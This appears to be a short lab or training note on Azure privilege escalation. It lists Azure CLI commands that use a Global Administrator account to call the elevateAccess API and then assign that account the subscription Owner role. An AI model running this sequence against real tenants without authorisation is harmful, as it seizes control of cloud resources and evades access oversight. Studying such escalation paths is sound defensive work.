# Global Administrator Privesc Scenarios

## Scenario 1 steps:

 - az login (Login as the Global Admin)

 - az login --allow-no-subscriptions (Get tenant-level access, then sign in again)

 - az rest --method post --url "/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01" (Exploit the Global Admin role to modify privileges to Azure resources)

 - az logout

 - az login (Reauthenticate back)

 - userPrincipalName=$(az ad signed-in-user show --query userPrincipalName -o tsv)

 - az role assignment create --role "Owner" --assignee $userPrincipalName (Assign the subscription Owner role to the Global Administrator account)

### The commands will be successful, proving that you have used your elevated Global Administrator role to modify permissions for Azure resources!

